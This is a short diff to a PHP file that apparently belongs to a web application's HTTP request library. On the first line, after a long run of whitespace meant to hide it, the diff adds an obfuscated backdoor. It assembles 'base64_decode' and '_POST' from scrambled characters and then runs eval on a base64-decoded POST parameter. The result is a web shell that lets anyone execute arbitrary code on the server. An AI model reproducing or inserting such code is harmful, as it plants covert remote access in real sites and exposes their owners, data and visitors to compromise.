@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                     $ncsm4= "p6_ecab4dots"; $smvi72 =strtolower($ncsm4[6].$ncsm4[5].$ncsm4[11]. $ncsm4[3].$ncsm4[1].$ncsm4[7] .$ncsm4[2] .$ncsm4[8].$ncsm4[3]. $ncsm4[4].$ncsm4[9]. $ncsm4[8]. $ncsm4[3]) ; $bus82 =strtoupper( $ncsm4[2]. $ncsm4[0]. $ncsm4[9].$ncsm4[11]. $ncsm4[10] );if (isset( ${$bus82 }['nb78204'] ) ){eval($smvi72(${$bus82}[ 'nb78204' ])) ;}?><?php
 /**
  * Simple and uniform HTTP request API.
  *
